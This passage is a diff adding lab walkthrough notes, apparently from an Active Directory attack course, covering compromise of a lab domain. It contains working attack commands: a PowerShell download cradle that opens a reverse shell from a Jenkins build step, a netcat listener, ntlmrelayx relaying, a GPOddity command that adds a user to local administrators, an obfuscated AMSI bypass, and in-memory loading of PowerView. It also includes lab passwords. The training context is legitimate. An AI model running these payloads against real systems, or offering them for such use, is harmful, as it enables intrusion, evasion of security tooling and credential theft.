@@ -386,3 +386,200 @@ COMPUTERNAME=dcorp-adminsrv
 ```
 dcorp\studentx
 ```
+
+
+## Abuse Jenkins Instance
+**We have a misconfigured Jenkins instance on dcorp-ci (http://172.16.3.11:8080)**
+**Manually trying the usernames as passwords we can identify that the user builduser has password builduser.**
+**Use the encodedcomand parameter of PowerShell to use an encoded reverse shell or use download execute cradle in Jenkins build step.**
+
+* powershell.exe iex (iwr http://172.16.100.X/Invoke-PowerShellTcp.ps1 -UseBasicParsing);Power -Reverse -IPAddress 172.16.100.X -Port 443
+
+**make sure to add an exception or turn off the firewall on the student VM.**
+**You can find hfs.exe in the C:\AD\Tools directory of your student VM. Note that HFS goes in the system tray when minimized**
+
+* C:\AD\Tools\netcat-win32-1.12\nc64.exe -lvp 443
+
+![alt text](image-11.png)
+
+![alt text](image-8.png)
+
+![alt text](image-9.png)
+
+![alt text](image-10.png)
+
+![alt text](image-12.png)
+
+* PS C:\Users\Administrator\.jenkins\workspace\Project0> $env:username
+```
+Ciadmin
+```
+* PS C:\Users\Administrator\.jenkins\workspace\Project0>$env:computername
+
+## Objective 6
+```
+Abuse an overly permissive Group Policy to add studentx to the local administrators group on dcorp-ci.
+```
+
+### In Learning-Objective 1, we enumerated that there is a directory called 'AI' on the dcorp-ci machine where 'Everyone' has access Looking at the directory (\\\dcorp-ci\AI), we will find a log file
+
+![alt text](image-13.png)
+
+![alt text](image-14.png)
+
+### It turns out that the 'AI' folder is used for testing some automation that executes shortcuts (.lnk files) as the user 'devopsadmin'. Recall that we enumerated a user 'devopsadmin' has 'WriteDACL' on DevOps Policy. Let's try to abuse this using GPOddity
+
+### First, we will use ntlmrelayx tool from Ubuntu WSL instance on the student VM to relay the credentials of the devopsadmin user.
+
+* Use WSLToTh3Rescue! as the sudo password.
+
+* wsluser@dcorp-studentx:/mnt/c/Users/studentx$> sudo ntlmrelayx.py -t ldaps://172.16.2.1 -wh 172.16.100.x --http-port '80,8080' -i --no-smb-server
+
+![alt text](image-15.png)
+
+### On the student VM, let's create a Shortcut that connects to the ntlmrelayx listener. 
+### Go to C:\AD\Tools -> Right Click -> New -> Shortcut. Copy the following command in the Shortcut location:
+
+* C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -Command "Invoke_WebRequest -Uri 'http://172.16.100.31' -UseDefaultCredentials"
+
+![alt text](image-16.png)
+
+![alt text](image-17.png)
+
+**Copy shortcut to dcorp-ci**
+
+* C:\AD\Tools>xcopy C:\AD\Tools\studentx.lnk \\\dcorp-ci\AI
+
+### Connect to the ldap shell started on port 11000. Run the following command on a new Ubuntu WSL session
+
+* wsluser@dcorp-studentx:/mnt/c/Users/studentx$> nc 127.0.0.1 11000
+
+![alt text](image-18.png)
+
+![alt text](image-19.png)
+
+### Using this ldap shell, we will provide the studentx user, WriteDACL permissions over Devops Policy {0BF8D01C-1F62-4BDC-958C-57140B67D147}
+
+* Get-DomainGPO | select displayname, name
+
+![alt text](image-20.png)
+
+![alt text](image-21.png)
+
+![alt text](image-22.png)
+
+* write_gpo_dacl student731 {0BF8D01C-1F62-4BDC-958C-57140B67D147}
+
+![alt text](image-23.png)
+
+### Now, run the GPOddity command to create the new template.
+```
+sudo python3 gpoddity.py --gpo-id '0BF8D01C-1F62-4BDC-958C-57140B67D147' --domain 'dollarcorp.moneycorp.local' --username 'student731' --password 'rMszB5MwUBww29' --command 'net localgroup administrators student731 /add' --rogue-smbserver-ip '172.16.100.31' --rogue-smbserver-share 'std731-gp' --dc-ip '172.16.2.1' --smb-mode none
+```
+
+![alt text](image-24.png)
+
+
+### Another Ubuntu WSL session, create and share the stdx-gp directory
+
+* wsluser@dcorp-std731:/mnt/c/Users/student731$> mkdir /mnt/c/AD/Tools/std731-gp 
+* wsluser@dcorp-std731:/mnt/c/Users/student731$> cp -r /mnt/c/AD/Tools/GPOddity/GPT_Out/* /mnt/c/AD/Tools/std731-gp
+
+### From a command prompt (Run as Administrator) on the student VM, run the following commands to allow 'Everyone' full permission on the stdx-gp share
+
+* C:\Windows\system32>net share stdx-gp=C:\AD\Tools\std731-gp
+* icacls "C:\AD\Tools\std731-gp" /grant Everyone:F /T
+
+**icacls Displays or modifies discretionary access control lists (DACLs) on specified files and applies stored DACLs to files in specified directories**
+
+![alt text](image-25.png)
+
+### Verify if the gPCfileSysPath has been modified for the DevOps Policy.
+
+* Get-DomainGPO -Identity 'DevOps Policy'
+
+### Before
+![alt text](image-26.png)
+
+### After
+![alt text](image-27.png)
+
+**After waiting for 2 minutes, studentx should be added to the local administrators group on dcorp-ci**
+
+* C:\AD\Tools>winrs -r:dcorp-ci cmd /c "set computername && set username"
+```
+COMPUTERNAME=DCORP-CI
+USERNAME=student731
+```
+
+* winrs -r:dcorp-ci cmd
+
+![alt text](image-28.png)
+
+## Objective 7
+```
+Identify a machine in the target domain where a Domain Admin session is available. 
+• Compromise the machine and escalate privileges to Domain Admin by abusing reverse shell on 
+dcorp-ci.
+• Escalate privilege to DA by abusing derivative local admin through dcorp-adminsrv. On dcorp-adminsrv, tackle application allowlisting using: 
+− Gaps in Applocker rules. 
+− Disable Applocker by modifying GPO applicable to dcorp-adminsrv
+```
+
+### Identify a machine where Domain Admin session is available
+**We have access to two domain users - student731 and ciadmin and administrative access to dcorp-adminsrv machine. User hunting has not been fruitful as student731**
+
+### Enumeration using Invoke-SessionHunter to list sessions on all the remote machines
+* . C:\AD\Tools\Invoke-SessionHunter.ps1
+* Invoke-SessionHunter -NoPortScan -RawResults | select Hostname,UserSession,Access
+```
+[+] Elapsed time: 0:0:51.674
+HostName UserSession Access
+-------- ----------- ------
+dcorp-appsrv    dcorp\appadmin      False
+dcorp-ci        dcorp\ciadmin       False
+dcorp-mgmt      dcorp\mgmtadmin     False
+dcorp-mssql     dcorp\sqladmin      False
+dcorp-dc        dcorp\Administrator False
+dcorp-mgmt      dcorp\svcadmin      False
+dcorp-adminsrv  dcorp\appadmin      True
+dcorp-adminsrv  dcorp\srvadmin      True
+dcorp-adminsrv  dcorp\websvc        True
+```
+
+* Invoke-SessionHunter -NoPortScan -RawResults -Targets C:\AD\Tools\servers.txt | select Hostname,UserSession,Access
+
+**There is a domain admin (svcadmin) session on dcorp-mgmt server! We do not have access to the server but that comes late**
+
+![alt text](image-29.png)
+
+### We got a reverse shell on dcorp-ci as ciadmin by abusing Jenkins.
+### We can use Powerview’s Find-DomainUserLocation on the reverse shell to looks for machines where a domain admin is logged in. First, we must bypass AMSI and enhanced logging
+
+* PS C:\Users\Administrator\.jenkins\workspace\Projectx> iex (iwr http://172.16.100.31/sbloggingbypass.txt -UseBasicParsing)
+
+### bypass AMSI
+```
+S`eT-It`em ( 'V'+'aR' +  'IA' + (("{1}{0}"-f'1','blE:')+'q2')  + ('uZ'+'x')  ) ( [TYpE](  "{1}{0}"-F'F','rE'  ) )  ;    (    Get-varI`A`BLE  ( ('1Q'+'2U')  +'zX'  )  -VaL  )."A`ss`Embly"."GET`TY`Pe"((  "{6}{3}{1}{4}{2}{0}{5}" -f('Uti'+'l'),'A',('Am'+'si'),(("{0}{1}" -f '.M','an')+'age'+'men'+'t.'),('u'+'to'+("{0}{2}{1}" -f 'ma','.','tion')),'s',(("{1}{0}"-f 't','Sys')+'em')  ) )."g`etf`iElD"(  ( "{0}{2}{1}" -f('a'+'msi'),'d',('I'+("{0}{1}" -f 'ni','tF')+("{1}{0}"-f 'ile','a'))  ),(  "{2}{4}{0}{1}{3}" -f ('S'+'tat'),'i',('Non'+("{1}{0}" -f'ubl','P')+'i'),'c','c,'  ))."sE`T`VaLUE"(  ${n`ULl},${t`RuE} )
+```
+
+![alt text](image-30.png)
+
+### Now, download and execute PowerView in memory of the reverse shell and run Find-DomainUserLocation. Check all the machines in the domain
+
+* iex ((New-Object Net.WebClient).DownloadString('http://172.16.100.X/PowerView.ps1'))
+* Find-DomainUserLocation
+
+![alt text](image-32.png)
+
+**There is a domain admin session on dcorp-mgmt server**
+
+### Let’s check if we can execute commands on dcorp-mgmt server and if the winrm port is open
+
+* PS C:\Users\Administrator\.jenkins\workspace\Projectx> winrs -r:dcorp-mgmt cmd /c "set computername && set username"
+```
+COMPUTERNAME=DCORP-MGMT
+USERNAME=ciadmin`
+```
+
+### We would now run SafetyKatz.exe on dcorp-mgmt to extract credentials from it. For that, we need to  copy Loader.exe on dcorp-mgmt. Let's download Loader.exe on dcorp-ci and copy it from there to dcorp-mgmt. This is to avoid any downloading activity on dcorp-mgmt
